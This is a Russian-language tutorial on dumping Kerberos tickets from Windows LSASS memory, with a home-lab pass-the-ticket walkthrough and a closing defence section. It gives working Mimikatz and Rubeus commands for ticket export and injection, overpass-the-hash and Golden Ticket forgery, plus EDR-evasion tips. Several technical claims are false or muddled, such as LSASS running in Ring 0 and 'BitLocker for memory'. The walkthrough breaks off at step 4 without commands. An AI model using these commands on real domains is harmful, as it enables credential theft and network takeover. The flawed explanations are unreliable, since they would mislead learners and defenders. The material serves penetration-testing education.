# Извлечение TGT из памяти LSASS: Механизмы, Эксплуатация и Детектирование

## Контекст и базовые понятия

LSASS (Local Security Authority Subsystem Service) является критическим системным процессом в операционных системах семейства Windows, отвечающим за enforcement (принудительное применение) политик безопасности, аутентификацию пользователей и управление токенами доступа. В контексте тестирования на проникновение и расследования инцидентов (IR) LSASS представляет собой «корону» (crown jewel) локальной системы: именно здесь хранятся материалы, необходимые для аутентификации в домене Active Directory (AD) и на локальных ресурсах. Понимание того, что именно находится в памяти LSASS, является фундаментом для освоения техник горизонтального перемещения, таких как Pass-the-Hash (PtH) и Pass-the-Ticket (PtT).

Ключевое разграничение в данной теме заключается в различии между **Credential Dumping** (извлечение учетных данных) как общим тактическим действием (MITRE ATT&CK T1003) и **LSASS Dumping** (извлечение памяти процесса LSASS) как специфическим методом доступа к этим данным. Credential Dumping может осуществляться через чтение базы SAM (локальные хеши), реестра (Cached Credentials) или базы NTDS.dit (на контроллере домена). LSASS Dumping же позволяет получить данные только для *активных* сессий, включая Kerberos TGT (Ticket Granting Ticket), TGS (Ticket Granting Service) и NTLM-хеши, которые в памяти существуют в виде сырых бинарных структур, доступных для чтения процессу с правами SYSTEM или администратора.

Другое важное разграничение — между **Pass-the-Hash** и **Pass-the-Ticket**. PtH использует NTLM-хеши паролей для аутентификации по протоколу NTLM. Этот метод работает на уровне транспортного/сеансового взаимодействия (SMB, WMI, WinRM) и не требует прямого взаимодействия с Kerberos-инфраструктурой для создания билета, хотя и может быть конвертирован в билет. PtT, напротив, подразумевает прямое использование уже сформированных Kerberos-билетов (TGT или TGS). PtT считается более «чистым» с точки зрения сетевого трафика, так как использует легитимные протокольные сообщения Kerberos, но требует наличия валидного TGT, который выдается только контроллером домена (KDC).

Существует также путаница между **TGT** и **TGS**. TGT (Ticket Granting Ticket) выдается KDC после первичной аутентификации пользователя (логина) и используется для запроса других сервисных билетов. Он хранится в памяти LSASS в секции, связанной с LUID (Logon ID) текущего сеанса. TGS выдается на основе TGT для доступа к конкретному сервису (например, CIFS для файлового шаринга). Извлечение TGT из LSASS критически важно для атак типа Golden Ticket (если известен хеш krbtgt) или для перемещения по сети без повторной аутентификации.

Ниже приведена сравнительная таблица, фиксирующая ключевые различия между типами данных, извлекаемых из LSASS, и методами их эксплуатации.

| Сущность / Данные в LSASS | Протокол аутентификации | Механизм эксплуатации | Уровень доступа для извлечения | Риски и последствия |
| :--- | :--- | :--- | :--- | :--- |
| **NTLM Hash (LM/NT)** | NTLM (v1/v2) | Pass-the-Hash (PtH) | SYSTEM / Admin | Прямая аутентификация по SMB/WMI. Не работает для Kerberos-сервисов без конвертации. |
| **Kerberos TGT** | Kerberos | Pass-the-Ticket (PtT) | SYSTEM / Admin | Получение новых TGS для любых сервисов. Основа для Golden Ticket атак. |
| **Kerberos TGS** | Kerberos | Pass-the-Ticket (PtT) | SYSTEM / Admin (или User) | Доступ к конкретному сервису (CIFS, HTTP). Не требует взаимодействия с KDC. |
| **Plaintext Password** | Любой (WDigest, DPAPI) | Clear-text reuse | SYSTEM / Admin (зависит от настроек) | Максимальная гибкость. Используется, если включен WDigest или сохранены пароли в браузерах/приложениях. |
| **Kerberos Session Key** | Kerberos | Ticket manipulation | SYSTEM / Admin | Позволяет дешифровать трафик или создавать Silver Tickets. |

Понимание этих различий определяет выбор инструментария. Для извлечения NTLM-хешей достаточно дампа памяти и парсинга структур `MSV1_0`. Для извлечения TGT требуются модули, умеющие парсить структуру `Kerberos` в памяти (например, `sekurlsa::tickets` в Mimikatz или `dump` в Rubeus), так как билеты хранятся в специфическом формате `kirbi` (ASN.1 DER encoding), инкапсулированном внутри структуры LSA.

## Внутреннее устройство LSASS и механизмы извлечения

LSASS работает в режиме ядра (Ring 0) и изолированно от пользовательских процессов. Он загружает Security Support Providers (SSP) — DLL-модули, которые обрабатывают различные протоколы аутентификации. Основные SSP, загружаемые в память LSASS:
1.  **Msv1_0.dll**: Обрабатывает NTLM аутентификацию. Хранит NTLM-хеши в памяти в виде структур `MSV1_0_PAC` (Privilege Attribute Certificate).
2.  **Kerberos.dll**: Обрабатывает Kerberos аутентификацию. Хранит TGT и TGS в структурах `KERB_TICKET`.
3.  **WDigest.dll**: (Отключен по умолчанию в современных Windows, но актуален для старых систем) Хранит пароли в открытом виде.
4.  **CredSSP.dll**: Используется для Remote Desktop (RDP) Single Sign-On.

Извлечение данных из LSASS невозможно стандартными средствами мониторинга памяти (например, `tasklist` или `Process Explorer` в режиме чтения), так как процесс защищен флагами `PROCESS_ALL_ACCESS` restrictions и, в современных системах, BitLocker Drive Encryption для памяти (если включен Credential Guard) или LSA Protection (RunAsPPL).

### Методы доступа к памяти LSASS

Специалисты по тестированию на проникновение используют три основных подхода к получению дампа памяти LSASS:

1.  **Прямой дамп через API (MiniDumpWriteDump)**: Использование легитимной функции `MiniDumpWriteDump` из библиотеки `dbghelp.dll`. Этот метод создает полный бинарный дамп процесса. Он эффективен, но часто детектируется EDR-системами по вызову API с высоким уровнем привилегий.
2.  **Обход защиты через Silent Process Exit**: Использование undocumented API `RtlReportSilentProcessExit`. Атакующий настраивает реестр (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe`), указывая путь для сохранения дампа при аварийном завершении LSASS. Затем вызывается `RtlReportSilentProcessExit`, что заставляет LSASS завершиться и сохранить дамп. Это позволяет обойти некоторые базовые защиты, так как дамп создается самим ядром Windows.
3.  **Инъекция кода (Code Injection)**: Внедрение shellcode в пространство адресов LSASS для выполнения дампа изнутри процесса. Это позволяет обойти проверки на доступ к памяти извне, но требует высокой квалификации для обхода EDR-фильтров (например, AMSI или ETW).

### Структура данных в памяти

В памяти LSASS данные организованы в виде связанных списков (linked lists), управляемых LSA. Каждая активная сессия имеет уникальный LUID (Logon Session ID). Для каждого LUID LSA создает структуру `LSA_LOGON_SESSION`, которая содержит указатели на пакеты аутентификации.

Для Kerberos билетов структура в памяти выглядит следующим образом (иллюстративная схема полей в структуре `KERB_TICKET`):

```text
[LSA_LOGON_SESSION]
    ├── Luid: 0x12345 (Logon ID)
    ├── DownLevelName: "user"
    ├── UpLevelName: "user@DOMAIN.LOCAL"
    └── Packages: [Linked List of LSA_AUTH_DATA_PACKAGE]
        └── [KERB_AUTH_DATA_PACKAGE]
            ├── TicketType: KERB_TICKET (0x00000002)
            ├── Ticket: [KERB_TICKET_STRUCTURE]
            │   ├── ClientName: "user@DOMAIN.LOCAL"
            │   ├── TicketFlags: 0x4080 (RENEWABLE, FORWARDABLE)
            │   ├── StartTime: <timestamp>
            │   ├── EndTime: <timestamp>
            │   ├── RenewUntil: <timestamp>
            │   ├── Key: [ENCRYPTED_KEY] (Session Key)
            │   └── TicketData: [ENCRYPTED_TGS_DATA] (Base64-encoded kirbi)
            └── NextPackage: NULL
```

При извлечении TGT через инструменты вроде Mimikatz, модуль `sekurlsa` сканирует память LSASS, ищет структуры `KERB_TICKET` с типом `KERB_TGT` (Ticket Granting Ticket) и извлекает поле `TicketData`. Это поле уже содержит билет в формате `kirbi` (Kerberos Interoperability), закодированном в Base64. Этот формат является стандартным для обмена билетами между инструментами (например, Rubeus, Impacket).

Важно отметить, что TGT в памяти LSASS зашифрован ключом `krbtgt` (для доменных пользователей) или локальным ключом (для локальных пользователей). Однако, поскольку LSASS обладает ключом для дешифрования этих билетов (чтобы проверить их валидность при аутентификации), он хранит их в дешифрованном виде в структуре `TicketData` для быстрого доступа, но сам билет (внешняя часть) остается зашифрованным для стороннего наблюдателя. При извлечении мы получаем именно этот зашифрованный билет, который можно затем использовать для аутентификации, так как KDC ожидает билет, зашифрованный ключом krbtgt.

### Защита и обход

Современные защиты включают:
*   **Credential Guard**: Использует Virtualization-Based Security (VBS) для изоляции хешей и ключей в защищенный контейнер (LSA Protection). LSASS в этом режиме не хранит хеши в своей основной памяти; они находятся в другом процессе (`lsass.exe` в VBS-контейнере), доступ к которому из обычного режима ядра невозможен.
*   **LSA Protection (RunAsPPL)**: Требует подписи кода для загрузки в LSASS и ограничивает доступ к процессу даже для SYSTEM.
*   **Event Log 4657/4663**: Запись событий доступа к объектам реестра и файлов, связанных с дампом.
*   **Sysmon Event 10 (ProcessAccess)**: Детектирует попытки чтения памяти LSASS другими процессами.

Для обхода Credential Guard атакующие часто переходят к извлечению данных из других источников, таких как `NTDS.dit` (если есть доступ к контроллеру домена) или используют атаки типа `DCSync`, которые не требуют прямого дампа LSASS, а имитируют запрос контроллера домена.

## Применение и работа с предметом

На практике извлечение TGT из LSASS является этапом пост-эксплуатации (Post-Exploitation). После получения кода с правами SYSTEM или администратора на рабочей станции или сервере, атакующий должен извлечь билет для последующего использования.

### Инструментарий и команды

Основными инструментами для работы с Kerberos-билетами в памяти являются **Mimikatz** и **Rubeus**.

**Mimikatz** — универсальный инструмент. Для извлечения TGT используется модуль `sekurlsa`.
Команда `sekurlsa::tickets /export` сканирует память LSASS, находит все активные Kerberos-билеты (TGT и TGS) и сохраняет их в файлы с расширением `.kirbi` в текущей директории. Имена файлов генерируются на основе LUID и имени пользователя.

```powershell
# Пример использования Mimikatz для извлечения всех билетов
privilege::debug
sekurlsa::tickets /export
```

Вывод этой команды содержит список сохраненных файлов. Например:
`[0;12bd0]-0-0-40810000-administrator@krbtgt-DOMAIN.LOCAL.kirbi`

Для прямого использования билета в текущем сеансе (Pass-the-Ticket) используется команда `kerberos::ptt`. Она принимает файл `.kirbi` в качестве аргумента и загружает билет в память текущего процесса, заменяя или дополняя существующие билеты.

```powershell
# Вставка билета в текущий сеанс
kerberos::ptt [0;12bd0]-0-0-40810000-administrator@krbtgt-DOMAIN.LOCAL.kirbi
```

После выполнения этой команды текущий сеанс получает привилегии пользователя `administrator` для всех сервисов, к которым у него есть доступ. Проверить наличие билета можно командой `kerberos::list`.

**Rubeus** — специализированный инструмент для работы с Kerberos. Он более модулен и часто используется для автоматизации.
Для извлечения TGT используется модуль `dump`.

```powershell
# Извлечение TGT для конкретного LUID или всех
.\Rubeus.exe dump /service:krbtgt /nowrap
```

Флаг `/nowrap` предотвращает перенос строк в выводе Base64, что удобно для последующей передачи в другие скрипты.

Для инъекции билета в Rubeus используется модуль `ptt`.

```powershell
# Вставка билета из Base64 строки
.\Rubeus.exe ptt /ticket:doIFVjCCBVKgAwIBBaEDA...
```

### Паттерны использования в пентесте

1.  **Lateral Movement через CIFS**: После извлечения TGT администратора, атакующий может подключиться к другим серверам по SMB без ввода пароля.
    ```bash
    # Использование Impacket с кэшированным билетом
    export KRB5CCNAME=/tmp/administrator.ccache
    smbclient //DC01/c$ -k -U administrator
    ```
    Флаг `-k` указывает использовать Kerberos-аутентификацию из кэша, а `-U` задает пользователя.

2.  **Overpass-the-Hash (Pass-the-Key)**: Если у атакующего есть только NTLM-хеши, но нет TGT, он может использовать Mimikatz для запроса нового TGT от KDC, используя хеш.
    ```powershell
    sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:<hash> /run:cmd.exe
    ```
    Эта команда создает новый процесс `cmd.exe` с валидным Kerberos-билетом, полученным от KDC на основе хеша. Это предпочтительнее чистого PtH, так как трафик Kerberos менее подозрителен для SIEM-систем, чем NTLM-трафик.

3.  **Persistence через Golden Ticket**: Если атакующий получает хеш учетной записи `krbtgt` (через DCSync или дамп контроллера домена), он может создать поддельный TGT, который будет валиден для всего домена.
    ```powershell
    kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /krbtgt:<krbtgt_hash> /id:500 /ptt
    ```
    Этот билет не истекает (если не задан флаг `/enddate`) и не может быть обнаружен стандартными средствами аудита AD, так как он криптографически корректен.

### Типичные ошибки и подводные камни

*   **Истечение билета**: TGT имеет время жизни (по умолчанию 10 часов). После истечения билет становится невалидным, и атакующий теряет доступ. Необходимо регулярно обновлять билеты или использовать Golden Tickets.
*   **Смена пароля**: Если пароль пользователя, чей TGT был извлечен, изменен, все его билеты становятся невалидными. Однако, если используется Golden Ticket, смена пароля пользователя не влияет на доступ.
*   **Детектирование EDR**: Прямой вызов `MiniDumpWriteDump` или использование известных утилит (Mimikatz, Rubeus) часто приводит к немедленному блокированию процесса. Атакующие используют обфускацию кода, инъекцию в легитимные процессы (например, `explorer.exe` или `svchost.exe`) или использование LOLBins (например, `rundll32.exe` с `comsvcs.dll`) для обхода.
*   **Неправильный формат билета**: При передаче билета между инструментами важно убедиться, что формат `.kirbi` корректен. Некоторые инструменты требуют Base64-кодировки, другие — бинарного формата.

## Сквозной практический пример: Извлечение TGT и горизонтальное перемещение

**Исходные условия**:
*   **Среда**: Домашняя лаборатория Active Directory.
    *   Контроллер домена: `DC01.corp.local` (IP: 192.168.1.10).
    *   Рабочая станция: `WS01.corp.local` (IP: 192.168.1.20).
    *   Пользователь: `admin_user` (Domain Admin), вошел в `WS01` по RDP.
*   **Инструменты**: Mimikatz (на атакующей машине), Impacket (на атакующей машине).
*   **Роль**: Пентестер, имеющий доступ к `cmd.exe` с правами `SYSTEM` на `WS01` (например, через выполнение кода в контексте SYSTEM).

**Шаг 1: Получение прав DEBUG и извлечение всех Kerberos-билетов из LSASS**

Атакующий запускает Mimikatz в контексте SYSTEM. Сначала необходимо получить привилегию `SeDebugPrivilege`, чтобы иметь доступ к памяти LSASS. Затем выполняется экспорт всех билетов.

```powershell
# 1. Получение привилегии отладки
privilege::debug

# 2. Экспорт всех билетов (TGT и TGS) в текущую директорию
sekurlsa::tickets /export

# Ожидаемый вывод:
# [0;12bd0]-0-0-40810000-admin_user@krbtgt-CORP.LOCAL.kirbi
# [0;12bd0]-0-0-40810000-admin_user@cifs-DC01.corp.local.kirbi
# ...
```

*Анализ*: Вывод показывает, что для пользователя `admin_user` с LUID `0x12bd0` извлечен TGT (`krbtgt-CORP.LOCAL`) и TGS для сервиса CIFS на контроллере домена (`cifs-DC01.corp.local`). Файлы `.kirbi` сохранены в текущей директории.

**Шаг 2: Проверка наличия билета и его валидности**

Перед использованием билета необходимо убедиться, что он валиден и не истек. В Mimikatz можно просмотреть детали билета.

```powershell
# Просмотр деталей всех билетов в текущем сеансе
kerberos::list

# Ожидаемый вывод (фрагмент):
#  Type  : Kerberos TGT (krbtgt-CORP.LOCAL)
#  Client : admin_user@CORP.LOCAL
#  Server : krbtgt/CORP.LOCAL@CORP.LOCAL
#  SType  : Ticket Granting Ticket (0x1)
#  Session : admin_user@CORP.LOCAL
#  Flags   : 40a00000 -> initial pre_auth enc
#  Start   : 2026-03-04 10:00:00
#  End     : 2026-03-04 20:00:00
#  Renew   : 2026-03-11 10:00:00
```

*Анализ*: Билет валиден до 20:00 текущего дня. Это дает 10 часов для горизонтального перемещения.

**Шаг 3: Инъекция билета в текущий сеанс (Pass-the-Ticket)**

Атакующий вставляет извлеченный TGT в текущий процесс Mimikatz (или в новый процесс `cmd.exe`, созданный через Mimikatz).

```powershell
# Вставка билета TGT для admin_user
# Имя файла берется из вывода шага 1
kerberos::ptt [0;12bd0]-0-0-40810000-admin_user@krbtgt-CORP.LOCAL.kirbi

# Ожидаемый вывод:
# Ticket injected successfully!
```

*Анализ*: Билет успешно загружен в память текущего процесса. Теперь любой вызов аутентификации Kerberos в этом процессе будет использовать права `admin_user`.

**Шаг 4: Горизонтальное перемещение на контроллер домена**

Атакующий использует Impacket для подключения к контроллеру домена по SMB, используя валидный Kerberos-билет.

```bash
# На атакующей машине (или в PowerShell с вызовом bash)
# Устанавливаем переменную окружения для использования кэшированного билета
# Сначала конвертируем .kirbi в ccache (формат, понятный Impacket)
# Используем impacket's getTGT.py или klist, но проще использовать Rubeus для конвертации
```

## Аналитический вывод

Извлечение TGT из памяти LSASS является критическим этапом в цепочке атак на Active Directory, позволяющим злоумышленникам обходить традиционные механизмы аутентификации и перемещаться по сети без использования паролей. Ключевая уязвимость заключается в том, что LSASS хранит материалы аутентификации в открытом виде (в контексте процесса) для обеспечения производительности, что делает его привлекательной целью для атак типа Credential Dumping. Техники Pass-the-Ticket, основанные на извлечении TGT, особенно опасны, так как они используют легитимные протоколы Kerberos, что затрудняет их обнаружение средствами, ориентированными на обнаружение аномалий в трафике или попытках входа.

Защита от таких атак требует многоуровневого подхода. Во-первых, внедрение Credential Guard и LSA Protection критически важно для изоляции секретов от процесса LSASS в обычном режиме ядра. Во-вторых, мониторинг доступа к памяти LSASS (например, через Sysmon Event 10 или EDR-решения) позволяет детектировать попытки дампа памяти. В-третьих, ограничение прав администраторов и использование Just-In-Time (JIT) доступа снижает вероятность компрометации учетных записей с высокими привилегиями. Наконец, регулярный аудит активных сессий и истечения билетов помогает минимизировать окно возможностей для злоумышленников. Понимание внутренних механизмов LSASS и Kerberos необходимо как для проведения эффективного тестирования на проникновение, так и для построения надежной системы обнаружения и реагирования.
